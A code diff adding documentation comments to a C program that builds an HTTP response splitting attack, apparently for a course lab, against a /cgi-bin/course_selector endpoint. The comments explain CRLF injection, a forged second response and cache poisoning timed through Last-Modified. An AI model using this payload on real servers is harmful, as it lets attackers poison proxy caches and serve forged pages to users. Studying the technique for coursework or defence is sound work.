@@ -6,6 +6,16 @@
 #define YOUR_ID "123456789"
 #define ONE_HOUR 3600
 
+/**
+ * Generates an RFC 1123 formatted timestamp for the Last-Modified header.
+ * The timestamp is set to exactly 1 hour before the current time.
+ * 
+ * This ensures the proxy cache formula Cache_Time = (Current_Time - Last_Modified) * 0.1
+ * gives us approximately 360 seconds (6 minutes) of cache duration.
+ * 
+ * @param buffer Output buffer to store the formatted timestamp
+ * @param buffer_size Size of the output buffer
+ */
 void generate_last_modified(char *buffer, size_t buffer_size) {
     time_t current_time = time(NULL);
     time_t modified_time = current_time - ONE_HOUR;
@@ -15,6 +25,17 @@ void generate_last_modified(char *buffer, size_t buffer_size) {
     strftime(buffer, buffer_size, "%a, %d %b %Y %H:%M:%S GMT", gmt);
 }
 
+/**
+ * Builds a simplified attack payload with URL-encoded CRLF injection.
+ * 
+ * Structure:
+ * - %0d%0a (CRLF) to break out of original response headers
+ * - Content-Length: 0 to terminate first response body
+ * - %0d%0a%0d%0a (double CRLF) to end first HTTP response
+ * - Injected second HTTP response with malicious content
+ * 
+ * @return Pointer to static buffer containing the payload
+ */
 char* build_attack_payload() {
     char last_modified[128];
     generate_last_modified(last_modified, sizeof(last_modified));
@@ -49,6 +70,15 @@ char* build_attack_payload() {
     return payload;
 }
 
+/**
+ * URL-encodes a string according to RFC 3986.
+ * 
+ * Encodes all characters except unreserved characters (A-Z, a-z, 0-9, -, _, ., ~).
+ * Spaces are converted to '+'. All other characters are percent-encoded as %XX.
+ * 
+ * @param str Input string to encode
+ * @return Pointer to static buffer containing the encoded string
+ */
 char* url_encode(const char *str) {
     static char encoded[8192];
     char *ptr = encoded;
@@ -72,6 +102,21 @@ char* url_encode(const char *str) {
     return encoded;
 }
 
+/**
+ * Constructs the complete HTTP request with response splitting payload.
+ * 
+ * Creates a GET request to /cgi-bin/course_selector with a malicious 'course' parameter.
+ * The parameter contains a URL-encoded HTTP response splitting attack that:
+ * 1. Breaks out of the original response with CRLF injection
+ * 2. Terminates the first response with Content-Length: 0
+ * 3. Injects a second HTTP/1.1 200 OK response with:
+ *    - Calculated Content-Length matching the body size
+ *    - Last-Modified header (current time - 1 hour) for cache control
+ *    - Content-Type: text/html
+ *    - Body containing <HTML>[YOUR_ID]</HTML>
+ * 
+ * @return Pointer to static buffer containing the full HTTP request
+ */
 char* build_full_request() {
     char last_modified[128];
     generate_last_modified(last_modified, sizeof(last_modified));
@@ -117,6 +162,14 @@ char* build_full_request() {
     return full_request;
 }
 
+/**
+ * Main function that demonstrates the attack payload generation.
+ * 
+ * Prints:
+ * - Generated Last-Modified timestamp
+ * - HTML body content and its length
+ * - Complete HTTP request with embedded response splitting payload
+ */
 int main() {
     printf("=== HTTP Response Splitting Attack Payload ===\n\n");
     
